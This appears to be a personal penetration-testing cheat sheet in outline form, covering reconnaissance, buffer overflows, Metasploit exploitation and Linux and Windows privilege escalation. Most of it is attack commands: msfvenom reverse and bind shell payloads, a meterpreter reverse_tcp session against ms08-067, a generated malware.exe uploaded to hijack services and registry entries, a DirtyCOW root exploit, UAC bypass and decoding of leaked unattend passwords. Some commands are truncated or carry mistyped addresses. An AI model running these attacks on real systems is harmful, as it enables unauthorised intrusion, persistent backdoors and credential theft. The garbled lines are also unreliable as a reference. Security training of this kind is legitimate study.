Reconnaissance>
	meta data 
		farming
			Manual
				//Download url of found file
					cd ~/Downloads
					wget https://www.sans.org/training/mgt512/paag.xls
				//Find meta data, look for creator and other info
					apt install exiftool
					exiftool paag.xls
			Automated
				metagoofil
				//Use google to search for files on a certain domain
				 //Install
					apt install metagoofil
					pip install requests 
					rm -rf /usr/share/metagoofil/  
					git clone https://github.com/WiReD-/metagoofil.git /usr/share/metagoofil
				//Run it, -d: domain, -t: kind of files, -l: max number of google search results to look back, -o: target to download files to, -f: name of output file where results are saved
					metagoofil {} {} {} {}
					//EG
						metagoofil -d sans.org -t doc,pdf,xls -l 200 -o sans_files -f sans_results.html
		removing
			//Extract metadata from your PDF files
			//Display metadata
				exiftool OrganizationsCoreAssignment.pdf	
			//Install tools
				apt install pdftk
				apt install qpdf
			//Remove metadata
				exiftool -all:all= OrganizationsCoreAssignment.pdf
			//Use a bash script that will make it harder to copy data
				//Give executable permissions
					chmod 755 ./clean_pdf
				//Move to path
					mv ./clean_pdf /usr/bin/clean_pdf	
				//Run script (as it now exists in path)
					clean_pdf OrganizationsCoreAssignment.pdf	
	Crack passwords
		Wordlists & CeWL>
		//After intercepting PW hashes going over a network
		//Crawl a site and pull out common words
			//Install
				apt install cewl
			//Run
				//-v: Verbose (more info), -d: Max link depth to crawl through, -w: outputFile
					cewl {} {} {} [targetSite]
				//EG
					cewl -v -d 1 -w words.txt https://www.sans.org
	DNS
		//Get info on a domain name
			whois sans.org
		//Zone transfer
			host -l [domainName] [vunerableNameServerIP]
		//enumerate DNS records using a wordlist
			//Guess valid sub domains, blank: Use default worldist, -W [wordListName]: 3rd party wordList, can use Kali Linux /usr/share wordlists
				dnsmap [domainName] {}	
	Find hidden directories in a website
		//Armed with a list of websites, you could start to find directories that are not linked directly in the public areas of the site.
		//Use a wordList to craft HTTP requests
			dirb http://myfakedomain.local /usr/share/wordlists/dirb/small.txt
	Port scan
		//Aim to find ports which have a vulnerable service listening
		//Scan for open ports
			//Connect scan (dont need root permissions, obvious scan that firewalls/IDS systems will flag)
				//-vv: 2nd level of verbosity (print Nmaps actions), -sT: TCP connect scan, -p-: Scan all ports (rather than just a 1000)
					nmap -vv -sT -p- 127.0.0.1
			//syn scan, normal tcp on open ports: Syn -> Syn-Ack -> Ack, syn scan: Syn -> Syn-Ack, closed ports: Syn -> Rst 
				nmap -vv -sS -p- 127.0.0.1				
		//Connect to open ports to get more info on running services
			nc 127.0.0.1 22
			//Do above step in nmap, with a version detection scan 
				nmap -vv -sV -p- 127.0.0.1	
			//Fingerprint OS 
				nmap -vv -O -p- 127.0.0.1	
			//Because UDP is connection-less, UDP scans can take a long time and aren't necessarily accurate.
				//UDP scan
				nmap -vv -sU -p- 127.0.0.1	
Exploitation>
	Binary application flaws>
		//Setup
			sudo apt install git
			git clone https://github.com/pwndbg/pwndbg
			cd pwndbg
			./setup.sh	
		pwndbg prompt>
			//Aliases: run: r, break: b, continue: c, Quit: q
			//Run it
				run
			//Get functions
				info functions
			//Break points
				//You can pause a programs execution by settings a break point
					break *[functionName]
					break *[functionMemoryAddress]	
				//Continue the program
					continue
				//Continue moving through the program and step into call instructions (you have to go through that function isntruction by instruction) (can be useful to call custom functions but a pain for standard ones)
					step
				//or continue but step over function calls
					next
				//Quit
					quit
			//Inspect memory
				//i: View instruction normally, x: View as hex, s: view as string
				//[instructionMemoryAddress], [memory registers]
					x/{} {}
				//EG
					x/i 0x565555a1
					x/x $esp
					//Show multiple enteries
						x/20x $esp
			//Disable a function
				disas [functionName]
		Exploit>
			Check if exploitable>
				//Create a file filled with characters
					python -c "print('A' * 200)" > input
				//Feed the new file into the exploitable program, EG buffer c program using fgets, check the return pointer is filled with data and the program crashes
					gdb ./buffer	
						run < input		
			Carry out Exploit>
				//Aim is to figure out what characters overflowed the return pointer
				//Install
					wget https://raw.githubusercontent.com/Svenito/exploit-pattern/master/pattern.py
				//Tell the program to generate a 200-byte cyclic pattern (any four bytes at any point are unique)
					python3 pattern.py 200 > input
					gdb ./buffer
					run < input	
				//Figure out how many bytes there are before the overflow (in the patturn)
					python3 pattern.py [memory location of the crash]
				Run hidden code>
					//Write an exploit script that prints a memory address considering the bytes before the overflow
						python3 exploit.py > input; gdb ./buffer; run < input
						//Now the memory address is written to the return pointer
						//Test out without GDB to run the code at that memory address
							./buffer < input
				Run shellcode>
					//Write an exploit script that runs a payload and uses a nop sled to account for gdp inaccuracy
					//View instructions after the return pointer to consider nop sled size
						x/100x $esp		
					python exploit.py | ./buffer
	Existing exploits>
		//Scan for open ports
			nmap -vv -sV 192.168.182.157
			//Check exploit-db.com for vulnerabilities
				// EG FreeFloat ftpd 1.00 file server running on windows XP
			//Create exploit script
				//Copy script from exploit-db
			//Generate shellcode with metasploit framework msfvenom tool
				//-a: architecture (x86 for 32 bit), -p: payload (EG bind to a port and wait for you to connect), --platform,
				// -b: bad characters (0X00 is a null byte, 0x0d is a carriage return, 0x0a is a newline character, any of these could cut of the input), -f: output format, [targetPort]: Dont use the target port if you just want to test the shellcode or exploit 
				msfvenom -a x86 -p windows/shell_bind_tcp --platform windows -b \x00\x0a\x0d -f python LPORT=4444
			//Swap exploit shellcode in the script with the new shellcode	
			//Run python script
				python freefloatftp.py 192.168.157 21
			//With netcat Connect to the listener that was launched by freefloatftp.py 's on the target port
				nc 92.168.182.157 4444
		Metasploit framework>
			Install>
				curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
				chmod 755 msfinstall
				sudo ./msfinstall 
			Setup>
				sudo chmod 775 /opt/metasploit-framework/apps/pro/ui/config/database.yml
				service postgresql start
				service metasploit start		
				msfconsole		
				db_status
			msf prompt>
				//Find an exploit in Metasploit's DB, EG windows XP exploit
					search ms08-067
					use exploit/windows/smb/ms08_067_netapi
				//List payloads
					search payload
					//Find one for windows
					//EG
						//payload/windows/meterpreter/reverse_tcp
							//effective malware, but well known by antimalware
							//instead of creating a listening service waiting for us to connect, the target will instead connect back to us.
							//Outbound connections aren't normally protected by firewalls
				set PAYLOAD windows/meterpreter/reverse_tcp
				//Set options
					options
					//Set target remote host
						set RHOST 192.168.182.154
					//Set the localhost	
						set LHOST 192.168.182.138
				exploit
				getuid
				screenshot
	Privilege Escalation>	
		Linux>
			//When you hack a system, either by exploiting a service, or sending a user a piece of malware, you gain access to that system with the same level of privileges as the service or user in question. 
			//Change ownership of a file to root
			sudo chown root:root ./demo
			-halt

			Exploiting Services>
				//Use local exploits to atk services not listening on the network

				//List running processes
				ps auxf
				//Identify software that is running and version numbers, then look for exploits in exploit-db
				//Check filesystem for installed software thats not always running

			Exploiting the Kernel>
				//Get kernel version
				uname -a	
				// linux kernel [version] exploit

				EG DirtyCOW for Linux Kernel 4.4.0-31
					//allowed an unprivileged user to overwrite a non-writeable file (file changed in memory)
					//download script from exploit-db and compile
					gcc -pthread dirty.c -o dirty -lcrypt
					//Run, enter password, then confirm line that will be written to /etc/passwd
					./dirty
					//Change user
					su pwned

			Wildcard Injection>
				//Take adv of how params are passed to programs
				//EG to delete files in the current directory (-r is needed to delete folders)
				rm *
				//Create a file called -rf, when you run rm * -rf will get injected and delete files/folders in the current directory

				//Reminder: crom jobs are scheduled tasks on linux, 
				//EG Rsync command used to sync the contents of two folders, -e allows to execute commands during the process
				Rsync -e
				//Create a .c file -> add shell codes, EG /usr/bin/whoami > whoami_result.txt
				//Create a file called -e sh file.c
				//The cron job runs a command such as 
				sudo rsync -t *.c foo:src/
				//The code in the .c file is executed with the cron jobs permissions

			Exploiting SUID (Set user ID) and SGID (Set Group ID)>
				// Sometimes a program needs root permissions to function, but it may also need to be available for non-root users to run it. 
				 // They need SUID/SGID permssions
				//SUID: a program permission that allows it to run with the owners privallges
				sudo chmod u+s ./demo
				//SGID: SUID but runs at group owners privallege level

				SUID Files>
					Look for binaries with SUID or SGID permissions set that are owned by the root user
					//Repersented by an s in file permission listings
					find / -perm -4000 -user root -type f -print 2>/dev/null
					find / -perm -2000 -user root -type f -print 2>/dev/null
					//Exploit these programs or see if they execute scripts that can be written to

					//Check for programs that execute scripts based on an environment variable
						ls -halt
						//Check it for $SCRIPT_PATH EV
						strings [vulnerableFile]
						//Look for that file and see if it you can edit it
						echo $SCRIPT_PATH
						//If you cant edit it make a new script in a different file and change the environment variable
						//EG  Create file with #!/bin/bash	whoami
						export SCRIPT_PATH=[pathToScript]
			sudo>
				//Allows normal user to run things as root
				//sudoers config file specifies who can run which commands as root
				//Get a root shell with sudo
				sudo find /etc -exec sh -i \;
				
		Windows>
			metasploitExploitSetup = () => {
				set PAYLOAD windows/meterpreter/reverse_tcp
				show options
				set SESSION 1
				//AV are bad at detecting powershell scripts
				set TECHNIQUE PSH
				set LHOST [localIPAddress]
				set LPORT 1338
				exploit
			}
			metasploitCreateAListener = () => {
			//Create a listener waiting for the new connection (in a second terminal window)
				use exploit/multi/handler
				metasploitExploitSetup()
			}
			metasploitRestartServiceAndMigrate = () => { 
				//Restart the service
					//Unlikely to work
						sc stop [vulnerable service]
						//Restart pc, not stealthy
						shutdown /r /t 0
				//The second terminal listener will immediately get a connection
					//Migration it quickly (Windows will think the service crashed and attempt to restart it, by migrating we can swap to a different process and even when Windows kills our original process our connection survives)	
					run post/windows/manage/migrate	
			}
			metasploitCreateMaliciousFileAndCreateAListener(){
				//Create a malicious file to upload and a listener to receive its connection
					//Open anouther terminal window
						//Create malicious file 
							msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=[localhost] LPORT=[localPort] -o malware.exe
							metasploitCreateAListener()
			}
			
			System > admin > normal user
			//The system user is reserved for system services which allow the OS to function
			//Reminder: admin executes a program -> be dropped to lower privileges unless the program needs higher privileges 
			// -> If it needs them a UAC popup will occur
			
			//Most examples already expect you to be in a situation where you are in a unprivileged Meterpreter session (have a shell within the target computer)
			Bypass UAC>
				Metasploit>
					Ask the user>
						//This triggers a UAC warning and if the user accepts you get privileged access
						//EG 
							use exploit/windows/local/ask
							metasploitExploitSetup()
							//Get OS info
							getuid
							//Get current permissions
							run post/windows/gather/win_privs
							//Get system privalleges
							getsystem
					bypassuac module>
						//Automatically tries a few different exploits to bypass UAC without user interaction:
						use exploit/windows/local/bypassuac
						metasploitExploitSetup()
						
					
			Kernel exploits>
				//Check if an OS is missing any patches, pick one to exploit
				use post/windows.gather/enum_patches
				metasploitExploitSetup()
				
				// EG kitrap0d for windows XP, gives system privalleges
				search ms10-015
				use exploit/windows/local/ms10_012_kitrap0d
				metasploitExploitSetup()
				
		 	Stored Credentials>
		   		//find passwords lying around on the file system
				//Usually the case where the system has been built in an enterprise environment as an unattended install
				//During the process of an automated script setting up the system, some config files are used to determine the 
				// account username and password, if the script has been misconfigured some files may get left behind
				//Check
				    C:\unattend.xml
					C:\Windows\System32\
					C:\Windows\System32\sysprep\
					C:\sysprep.inf
					C:\sysprep\sysprep.xml
					C:\Windows\Panther\
					C:\Windows\Panther\Unattend\
						<Password>
							<Value>cGFzc3cwcmQhCg==</Value>
							<PlainText>false</PlainText>
						</Password>												
						echo "cGFzc3cwcmQhCg==" | base64 -d
			Target services>			
				Unquoted Service Paths>
					//Method to elevate to system if UAC exploits arent working
					//Look for unquoted service paths, some services run as system user		
					wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
					//What paths you can exploit
						//proper service path
						 //"C:\Program Files\Vuln Service\Application Files\program.exe"
						//No quotes 
							//C:\Program Files\Vuln Service\Application Files\program.exe
							//Windows will try
							//C:\Program.exe -> C:\Program Files\Vuln.exe -> C:\Program Files\Vuln Service\Application.exe -> C:\Program Files\Vuln Service\Application Files\program.exe
							//What ever location you have privallges to create fiiles, create a malicious .exe file 
							//C:\Program.exe is unexploitable since users dont have access to write to the C drive
					//EG exploit   C:\Program Files\Vuln Service\Application Files\program.exe
						//Find folder permissions
						icacls "C:\Program Files\Vuln Service"		
						metasploitCreateMaliciousFileAndCreateAListener()		
						//Exit shell
						exit
						//Upload malicious files
						cd C:\ -> cd "Program Files" -> cd "Vuln Service"						
						upload -f Application.exe
						//Now we just need to restart the service so that the exploit is run and we gain access
						metasploitRestartServiceAndMigrate()
						
					//Do the above example in one go
					use exploit/windows/local/trusted_service_path						
				Weak Registry Permissions>
					//Every service on Windows has a matching registry key, which holds all the information about the path (and the other settings) to the service executable.
					//Download tool to look at registry permissions from the command line, run installer on windows VM to get the subinacl.exe file
					https://www.microsoft.com/en-us/download/confirmation.aspx?id=23510
					//Make sure you are in C:\users\usermode\AppData\Local\Temp
					pwd
					//Upload file
					upload -f subinacl.exe
					//Registry key with service info
						//HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<SERVICENAME>
					//Drop back to the shell
					shell
					//List running services
					wmic service get name,startname
					//Display permissions
					subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
					//Create a malicious file to upload and a listener to receive its connection
					metasploitCreateMaliciousFileAndCreateAListener()		
					//Exit shell
						exit
						//Upload malicious files
						upload -f malware.exe
					//Drop back to shell, update registry entry
					shell
					reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /t 
					REG_EXPAND_SZ /v ImagePath /d "C:\Users\usermode\AppData\Local\Temp\malware.exe" /f
										
					metasploitRestartServiceAndMigrate()

				Weak Folder Permissions>
					//find a service which has an executable in a folder that you are allowed to modify, swap executable for your own malware
					//List folder permissions
					icacls "C:\Program Files\Vuln Service\Application Files"
					//Similar to previous two
					List the permissions using 'icacl's -> Generate a malicious program using 'msfvenom' called program.exe.
					-> In a new terminal window, start an instance of 'exploit/multi/handler' to listen for the connection when the malware runs.
					-> Upload your malicious 'program.exe' into the 'C:\Program Files\Vuln Service\Application Files\', overwriting the existing 'program.exe`'
					-> Restart the service (if you have permission), or wait for the computer to reboot, or send the shutdown /r /t 0 command to forcefully reboot the computer. When the service runs, the connection will come into your exploit/multi/handler listener.
				
				AlwaysInstallElevated>
					//The 'AlwaysInstallElevated' setting can be enabled on Windows through Group Policy. 
					// Some administrators will configure this so that users can install software on their computers without administrator approval 
					
					//Check if its configured by checking these paths
					HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
					HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
					
					reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
					reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
					
					//Create a new terminal window		
						//Create .msi installer to run exe, create liscener to receive connection
						msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\usermode\AppData\Local
						metasploitCreateAListener()
					//Upload files to the temp folder
					cd %temp%
					upload -f mal.exe
					upload -f mal.msi
					//Run malicious installer
						shell
						// /quiet: no user messages, /qn no GUI, /i run as a normal user 
						msiexec /quiet /qn /i mal.msi	 	